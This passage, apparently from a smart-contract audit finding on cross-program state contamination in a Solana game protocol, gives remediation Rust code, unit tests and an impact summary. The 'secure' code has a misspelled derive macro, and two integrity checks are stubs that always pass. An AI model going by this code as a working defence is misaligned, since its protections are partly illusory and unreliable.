    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub enum SecurityLevel {
        Untrusted,
        Basic,
        Verified,
        TrustedPartner,
        Official,
    }

    #[derive(AnchorSerialize, AncherDeserialize, Clone, Debug)]
    pub enum AllowedOperation {
        ReadData,
        ModifyOwnData,
        ModifySharedData,
        TokenTransfer,
        StateUpdate,
        Callback,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub enum BanReason {
        MaliciousActivity,
        SecurityViolation,
        ContractViolation,
        DataCorruption,
        UnauthorizedAccess,
    }

    // Secure CPI execution context
    #[derive(Clone)]
    pub struct SecureCPIContext {
        pub caller_program: Pubkey,
        pub target_program: Pubkey,
        pub operation_type: AllowedOperation,
        pub call_depth: u8,
        pub start_time: i64,
        pub state_hash_before: [u8; 32],
        pub value_limit: u64,
    }

    // Secure external program validation
    pub fn validate_external_program_call(
        registry: &SecureExternalProgramRegistry,
        target_program: Pubkey,
        operation: AllowedOperation,
        call_context: &SecureCPIContext
    ) -> Result<bool> {
        // Check emergency lockdown
        if registry.emergency_lockdown {
            return Ok(false);
        }

        // Check if program is banned
        for banned in &registry.banned_programs {
            if banned.program_id == target_program {
                return Ok(false);
            }
        }

        // Find allowed program entry
        let allowed_program = registry.allowed_programs
            .iter()
            .find(|p| p.program_id == target_program)
            .ok_or(ErrorCode::UnauthorizedExternalProgram)?;

        // Validate operation is allowed
        require!(
            allowed_program.allowed_operations.contains(&operation),
            ErrorCode::OperationNotAllowed
        );

        // Check security level requirements
        require!(
            matches!(allowed_program.security_level,
                SecurityLevel::Verified | SecurityLevel::TrustedPartner | SecurityLevel::Official),
            ErrorCode::InsufficientSecurityLevel
        );

        // Validate call depth
        require!(
            call_context.call_depth <= MAX_CPI_DEPTH,
            ErrorCode::CPIDepthExceeded
        );

        // Check usage limits
        validate_usage_limits(allowed_program, call_context)?;

        Ok(true)
    }

    // Secure oracle data validation
    pub fn validate_oracle_data_secure(
        ctx: Context<ValidateOracleDataSecure>,
        oracle_program: Pubkey,
        expected_data_type: OracleDataType
    ) -> Result<()> {
        let registry = &ctx.accounts.program_registry;
        let game_session = &mut ctx.accounts.game_session;
        let oracle_data = &mut ctx.accounts.oracle_data;
        let clock = Clock::get()?;

        // Create secure CPI context
        let cpi_context = SecureCPIContext {
            caller_program: ctx.program_id,
            target_program: oracle_program,
            operation_type: AllowedOperation::ReadData,
            call_depth: 1,
            start_time: clock.unix_timestamp,
            state_hash_before: calculate_state_hash(game_session)?,
            value_limit: 0, // Read-only operation
        };

        // Validate external program
        require!(
            validate_external_program_call(
                registry,
                oracle_program,
                AllowedOperation::ReadData,
                &cpi_context
            )?,
            ErrorCode::OracleValidationFailed
        );

        // Execute secure CPI with validation
        let oracle_cpi_accounts = SecureOracleCall {
            data_account: oracle_data.to_account_info(),
            validator: ctx.accounts.authority.to_account_info(),
            registry: registry.to_account_info(),
        };

        let oracle_cpi_program = ctx.accounts.oracle_program.to_account_info();
        let oracle_cpi_ctx = CpiContext::new(oracle_cpi_program, oracle_cpi_accounts);

        // Call with timeout and validation
        let oracle_result = execute_validated_cpi(
            oracle_cpi_ctx,
            &cpi_context,
            ExternalOperation::GetOracleData(expected_data_type),
        )?;

        // Validate returned data
        validate_oracle_response(&oracle_result, expected_data_type)?;

        // Update game session with validated data only
        if let ExternalOperationResult::OracleData(validated_data) = oracle_result {
            game_session.external_price_feed = validated_data.price;
            game_session.data_source = oracle_program;
            game_session.data_timestamp = clock.unix_timestamp;
        }

        // Verify state integrity after external call
        let state_hash_after = calculate_state_hash(game_session)?;
        validate_state_integrity(&cpi_context.state_hash_before, &state_hash_after)?;

        Ok(())
    }

    // Secure token operation with program validation
    pub fn process_secure_token_operation(
        ctx: Context<ProcessSecureTokenOperation>,
        operation: SecureTokenOperation
    ) -> Result<()> {
        let registry = &ctx.accounts.program_registry;
        let player_account = &mut ctx.accounts.player_account;
        let token_account = &ctx.accounts.token_account;
        let clock = Clock::get()?;

        // Validate token program is official SPL Token
        require!(
            ctx.accounts.token_program.key() == spl_token::ID,
            ErrorCode::UntrustedTokenProgram
        );

        // Create secure CPI context
        let cpi_context = SecureCPIContext {
            caller_program: ctx.program_id,
            target_program: spl_token::ID,
            operation_type: AllowedOperation::TokenTransfer,
            call_depth: 1,
            start_time: clock.unix_timestamp,
            state_hash_before: calculate_account_hash(player_account)?,
            value_limit: operation.get_value_limit(),
        };

        // Validate operation limits
        require!(
            operation.get_amount() <= cpi_context.value_limit,
            ErrorCode::OperationExceedsLimit
        );

        // Execute secure token transfer
        match operation {
            SecureTokenOperation::Deposit { amount, source } => {
                // Validate source account ownership
                require!(
                    source == ctx.accounts.authority.key(),
                    ErrorCode::UnauthorizedTokenSource
                );

                // Execute transfer with validation
                let transfer_cpi_accounts = Transfer {
                    from: token_account.to_account_info(),
                    to: player_account.to_account_info(),
                    authority: ctx.accounts.authority.to_account_info(),
                };

                let transfer_cpi_program = ctx.accounts.token_program.to_account_info();
                let transfer_cpi_ctx = CpiContext::new(transfer_cpi_program, transfer_cpi_accounts);

                spl_token::transfer(transfer_cpi_ctx, amount)?;

                // Update balance with validation
                let previous_balance = player_account.token_balance;
                player_account.token_balance = previous_balance
                    .checked_add(amount)
                    .ok_or(ErrorCode::BalanceOverflow)?;
            }
            SecureTokenOperation::Withdraw { amount, destination } => {
                // Validate sufficient balance
                require!(
                    player_account.token_balance >= amount,
                    ErrorCode::InsufficientBalance
                );

                // Execute withdrawal
                let transfer_cpi_accounts = Transfer {
                    from: player_account.to_account_info(),
                    to: ctx.accounts.destination_account.to_account_info(),
                    authority: ctx.accounts.authority.to_account_info(),
                };

                let transfer_cpi_program = ctx.accounts.token_program.to_account_info();
                let transfer_cpi_ctx = CpiContext::new(transfer_cpi_program, transfer_cpi_accounts);

                spl_token::transfer(transfer_cpi_ctx, amount)?;

                // Update balance
                player_account.token_balance = player_account.token_balance
                    .checked_sub(amount)
                    .ok_or(ErrorCode::BalanceUnderflow)?;
            }
        }

        // Log secure operation
        emit!(SecureTokenOperationExecuted {
            player: player_account.key(),
            operation: operation.to_string(),
            amount: operation.get_amount(),
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Secure plugin execution with sandboxing
    pub fn execute_secure_plugin(
        ctx: Context<ExecuteSecurePlugin>,
        plugin_program: Pubkey,
        plugin_config: SecurePluginConfig
    ) -> Result<()> {
        let registry = &ctx.accounts.program_registry;
        let game_session = &mut ctx.accounts.game_session;
        let clock = Clock::get()?;

        // Validate plugin program
        let allowed_program = registry.allowed_programs
            .iter()
            .find(|p| p.program_id == plugin_program &&
                     matches!(p.program_type, ExternalProgramType::Plugin))
            .ok_or(ErrorCode::UnauthorizedPlugin)?;

        require!(
            allowed_program.trust_score >= 75, // High trust required for plugins
            ErrorCode::PluginTrustScoreTooLow
        );

        // Create sandboxed execution context
        let sandbox_context = PluginSandbox {
            allowed_operations: allowed_program.allowed_operations.clone(),
            memory_limit: 1024 * 1024, // 1MB limit
            computation_limit: 100_000, // 100k compute units
            network_access: false,
            state_modification_allowed: matches!(
                allowed_program.security_level,
                SecurityLevel::TrustedPartner | SecurityLevel::Official
            ),
        };

        // Validate plugin configuration
        validate_plugin_config(&plugin_config)?;

        // Execute plugin in sandbox
        let plugin_result = execute_sandboxed_plugin(
            plugin_program,
            plugin_config,
            sandbox_context,
            ctx.accounts.plugin_state.to_account_info(),
        )?;

        // Apply validated plugin results
        apply_plugin_results(game_session, plugin_result)?;

        Ok(())
    }

    // Secure callback system with reentrancy protection
    pub fn register_secure_callback(
        ctx: Context<RegisterSecureCallback>,
        callback_program: Pubkey,
        trigger_condition: SecureCallbackTrigger
    ) -> Result<()> {
        let registry = &ctx.accounts.program_registry;
        let game_session = &mut ctx.accounts.game_session;

        // Validate callback program
        require!(
            validate_external_program_call(
                registry,
                callback_program,
                AllowedOperation::Callback,
                &create_default_cpi_context(callback_program)?
            )?,
            ErrorCode::UnauthorizedCallbackProgram
        );

        // Check callback limits
        require!(
            game_session.registered_callbacks.len() < 5, // Max 5 callbacks
            ErrorCode::TooManyCallbacks
        );

        // Create secure callback entry
        let secure_callback = SecureCallback {
            program_id: callback_program,
            trigger: trigger_condition,
            enabled: true,
            registered_at: Clock::get()?.unix_timestamp,
            execution_count: 0,
            max_executions: 100, // Limit executions
            reentrancy_guard: false,
        };

        game_session.registered_callbacks.push(secure_callback);

        Ok(())
    }

    // Secure callback execution with reentrancy protection
    pub fn execute_secure_callbacks(ctx: Context<ExecuteSecureCallbacks>) -> Result<()> {
        let game_session = &mut ctx.accounts.game_session;
        let clock = Clock::get()?;

        for callback in &mut game_session.registered_callbacks {
            if callback.enabled &&
               !callback.reentrancy_guard &&
               should_trigger_secure_callback(&callback.trigger, game_session) {

                // Set reentrancy guard
                callback.reentrancy_guard = true;

                // Check execution limits
                if callback.execution_count >= callback.max_executions {
                    callback.enabled = false;
                    continue;
                }

                // Execute callback with protection
                let callback_result = execute_protected_callback(
                    callback.program_id,
                    game_session,
                    &ctx.remaining_accounts
                );

                // Reset reentrancy guard
                callback.reentrancy_guard = false;

                match callback_result {
                    Ok(_) => {
                        callback.execution_count += 1;
                    }
                    Err(e) => {
                        // Disable callback on error
                        callback.enabled = false;
                        msg!("Callback {} disabled due to error: {}", callback.program_id, e);
                    }
                }
            }
        }

        Ok(())
    }

    // Helper functions
    fn validate_usage_limits(
        allowed_program: &AllowedProgram,
        call_context: &SecureCPIContext
    ) -> Result<()> {
        // Check call frequency limits
        // Check value limits
        // Check state modification limits
        // Implementation depends on tracking system
        Ok(())
    }

    fn calculate_state_hash(game_session: &GameSession) -> Result<[u8; 32]> {
        let state_data = game_session.try_to_vec()?;
        Ok(solana_program::hash::hash(&state_data).to_bytes())
    }

    fn calculate_account_hash(player_account: &PlayerAccount) -> Result<[u8; 32]> {
        let account_data = player_account.try_to_vec()?;
        Ok(solana_program::hash::hash(&account_data).to_bytes())
    }

    fn validate_state_integrity(
        hash_before: &[u8; 32],
        hash_after: &[u8; 32]
    ) -> Result<()> {
        // Allow controlled state changes
        // Detect unauthorized modifications
        // Implementation depends on specific requirements
        Ok(())
    }

    fn validate_oracle_response(
        result: &ExternalOperationResult,
        expected_type: OracleDataType
    ) -> Result<()> {
        match (result, expected_type) {
            (ExternalOperationResult::OracleData(data), OracleDataType::Price) => {
                require!(
                    data.price > 0 && data.price < 1_000_000_000, // Reasonable price bounds
                    ErrorCode::InvalidOraclePrice
                );
            }
            (ExternalOperationResult::OracleData(data), OracleDataType::MarketData) => {
                require!(
                    data.timestamp > 0 && data.timestamp <= Clock::get()?.unix_timestamp,
                    ErrorCode::InvalidOracleTimestamp
                );
            }
            _ => return Err(ErrorCode::InvalidOracleResponse.into()),
        }

        Ok(())
    }

    fn validate_plugin_config(config: &SecurePluginConfig) -> Result<()> {
        require!(
            !config.name.is_empty() && config.name.len() <= 64,
            ErrorCode::InvalidPluginName
        );

        require!(
            config.version.len() <= 16,
            ErrorCode::InvalidPluginVersion
        );

        require!(
            config.configuration_data.len() <= 1024, // 1KB max config
            ErrorCode::PluginConfigTooLarge
        );

        Ok(())
    }
}

// Enhanced account structures
#[account]
pub struct SecureGameSession {
    pub session_id: u64,
    pub status: GameStatus,
    pub external_price_feed: u64,
    pub data_source: Pubkey,
    pub data_timestamp: i64,
    pub registered_callbacks: Vec<secure_cross_program::SecureCallback>,
    pub plugin_executions: Vec<PluginExecution>,
    pub cross_program_calls: u32,
    pub state_integrity_hash: [u8; 32],
}

#[account]
pub struct SecurePlayerAccount {
    pub owner: Pubkey,
    pub token_balance: u64,
    pub verified_operations: Vec<VerifiedOperation>,
    pub external_interactions: u32,
    pub last_external_call: i64,
}

// Secure instruction contexts
#[derive(Accounts)]
#[instruction(oracle_program: Pubkey, expected_data_type: OracleDataType)]
pub struct ValidateOracleDataSecure<'info> {
    #[account(mut)]
    pub game_session: Account<'info, SecureGameSession>,

    #[account(mut)]
    pub oracle_data: AccountInfo<'info>,

    #[account()]
    pub program_registry: Account<'info, secure_cross_program::SecureExternalProgramRegistry>,

    #[account()]
    pub oracle_program: AccountInfo<'info>,

    #[account(mut)]
    pub authority: Signer<'info>,

    pub clock: Sysvar<'info, Clock>,
}

// Events
#[event]
pub struct SecureTokenOperationExecuted {
    pub player: Pubkey,
    pub operation: String,
    pub amount: u64,
    pub timestamp: i64,
}

// Enhanced error codes
#[error_code]
pub enum ErrorCode {
    #[msg("Unauthorized external program")]
    UnauthorizedExternalProgram,

    #[msg("Operation not allowed")]
    OperationNotAllowed,

    #[msg("Insufficient security level")]
    InsufficientSecurityLevel,

    #[msg("CPI depth exceeded")]
    CPIDepthExceeded,

    #[msg("Oracle validation failed")]
    OracleValidationFailed,

    #[msg("Untrusted token program")]
    UntrustedTokenProgram,

    #[msg("Operation exceeds limit")]
    OperationExceedsLimit,

    #[msg("Unauthorized token source")]
    UnauthorizedTokenSource,

    #[msg("Balance overflow")]
    BalanceOverflow,

    #[msg("Insufficient balance")]
    InsufficientBalance,

    #[msg("Balance underflow")]
    BalanceUnderflow,

    #[msg("Unauthorized plugin")]
    UnauthorizedPlugin,

    #[msg("Plugin trust score too low")]
    PluginTrustScoreTooLow,

    #[msg("Invalid plugin name")]
    InvalidPluginName,

    #[msg("Invalid plugin version")]
    InvalidPluginVersion,

    #[msg("Plugin config too large")]
    PluginConfigTooLarge,

    #[msg("Unauthorized callback program")]
    UnauthorizedCallbackProgram,

    #[msg("Too many callbacks")]
    TooManyCallbacks,

    #[msg("Invalid oracle price")]
    InvalidOraclePrice,

    #[msg("Invalid oracle timestamp")]
    InvalidOracleTimestamp,

    #[msg("Invalid oracle response")]
    InvalidOracleResponse,
}
```

### Testing Requirements

```rust
#[cfg(test)]
mod secure_cross_program_tests {
    use super::*;
    use solana_program_test::*;
    use solana_sdk::{
        signature::{Keypair, Signer},
        transaction::Transaction,
    };

    #[tokio::test]
    async fn test_unauthorized_program_rejection() {
        // Test that unregistered external programs are rejected
        let registry = create_test_registry();
        let unauthorized_program = Pubkey::new_unique();

        let result = secure_cross_program::validate_external_program_call(
            &registry,
            unauthorized_program,
            secure_cross_program::AllowedOperation::ReadData,
            &create_test_cpi_context(unauthorized_program),
        );

        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_banned_program_rejection() {
        // Test that banned programs are rejected
        let mut registry = create_test_registry();
        let banned_program = Pubkey::new_unique();

        registry.banned_programs.push(secure_cross_program::BannedProgram {
            program_id: banned_program,
            banned_by: Pubkey::new_unique(),
            ban_date: 0,
            ban_reason: secure_cross_program::BanReason::MaliciousActivity,
            permanent: true,
        });

        let result = secure_cross_program::validate_external_program_call(
            &registry,
            banned_program,
            secure_cross_program::AllowedOperation::ReadData,
            &create_test_cpi_context(banned_program),
        );

        assert!(result.is_ok() && !result.unwrap());
    }

    #[tokio::test]
    async fn test_cpi_depth_limits() {
        // Test that excessive CPI depth is rejected
        let registry = create_test_registry();
        let program = add_trusted_program_to_registry();

        let mut cpi_context = create_test_cpi_context(program);
        cpi_context.call_depth = 10; // Exceeds limit

        let result = secure_cross_program::validate_external_program_call(
            &registry,
            program,
            secure_cross_program::AllowedOperation::ReadData,
            &cpi_context,
        );

        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_reentrancy_protection() {
        // Test that reentrancy is properly prevented
        let mut game_session = create_test_game_session();
        let callback_program = Pubkey::new_unique();

        // Register callback
        let callback = secure_cross_program::SecureCallback {
            program_id: callback_program,
            trigger: create_test_trigger(),
            enabled: true,
            registered_at: 0,
            execution_count: 0,
            max_executions: 100,
            reentrancy_guard: false,
        };

        game_session.registered_callbacks.push(callback);

        // Simulate reentrancy attempt
        let mut callback_ref = &mut game_session.registered_callbacks[0];
        callback_ref.reentrancy_guard = true;

        // Should not execute due to reentrancy guard
        let should_execute = !callback_ref.reentrancy_guard;
        assert!(!should_execute);
    }

    #[tokio::test]
    async fn test_state_integrity_validation() {
        // Test that state tampering is detected
        let game_session = create_test_game_session();
        let hash_before = secure_cross_program::calculate_state_hash(&game_session).unwrap();

        let mut modified_session = game_session;
        modified_session.session_id = 999999; // Unauthorized modification

        let hash_after = secure_cross_program::calculate_state_hash(&modified_session).unwrap();

        assert_ne!(hash_before, hash_after);
    }

    // Helper functions for tests
    fn create_test_registry() -> secure_cross_program::SecureExternalProgramRegistry {
        secure_cross_program::SecureExternalProgramRegistry {
            admin: Pubkey::new_unique(),
            allowed_programs: Vec::new(),
            banned_programs: Vec::new(),
            registry_version: 1,
            last_updated: 0,
            emergency_lockdown: false,
        }
    }

    fn create_test_cpi_context(target_program: Pubkey) -> secure_cross_program::SecureCPIContext {
        secure_cross_program::SecureCPIContext {
            caller_program: Pubkey::new_unique(),
            target_program,
            operation_type: secure_cross_program::AllowedOperation::ReadData,
            call_depth: 1,
            start_time: 0,
            state_hash_before: [0u8; 32],
            value_limit: 1000,
        }
    }

    fn create_test_game_session() -> SecureGameSession {
        SecureGameSession {
            session_id: 1,
            status: GameStatus::InProgress,
            external_price_feed: 0,
            data_source: Pubkey::default(),
            data_timestamp: 0,
            registered_callbacks: Vec::new(),
            plugin_executions: Vec::new(),
            cross_program_calls: 0,
            state_integrity_hash: [0u8; 32],
        }
    }
}
```

## Business Impact

### Financial Risk
- **Protocol Treasury Drainage**: Malicious external programs can manipulate fund flows
- **User Fund Theft**: Cross-program contamination enables unauthorized access to user balances
- **Market Manipulation**: Oracle contamination can artificially inflate/deflate reward calculations

### Operational Impact
- **System Integrity Loss**: Contaminated state can cause unpredictable protocol behavior
- **Trust Relationship Breakdown**: Users lose confidence in external integrations
- **Service Disruption**: Malicious callbacks can cause reentrancy attacks and DoS

### User Impact
- **Account Compromise**: External programs can manipulate user account data
- **Game Result Manipulation**: Contaminated oracles and leaderboards affect fair play
- **Data Privacy Violation**: Malicious programs can access and exfiltrate user data

## Recommended Testing

### Cross-Program Security Tests
```bash
# External program validation tests
cargo test test_unauthorized_program_rejection --release
cargo test test_banned_program_rejection --release
cargo test test_security_level_enforcement --release

# Contamination prevention tests
cargo test test_state_isolation --release
cargo test test_reentrancy_protection --release
cargo test test_cpi_depth_limits --release

# Integration security tests
cargo test test_oracle_data_validation --release
cargo test test_token_program_verification --release
cargo test test_plugin_sandbox_enforcement --release
```

### Security Validation
```bash
# Comprehensive cross-program security testing
./scripts/test_cross_program_security.sh
./scripts/audit_external_integrations.sh
./scripts/validate_cpi_isolation.sh
```

This vulnerability represents one of the most complex and dangerous attack vectors in Solana, as it exploits the fundamental cross-program interaction mechanisms to completely compromise protocol integrity through state contamination and trust boundary violations.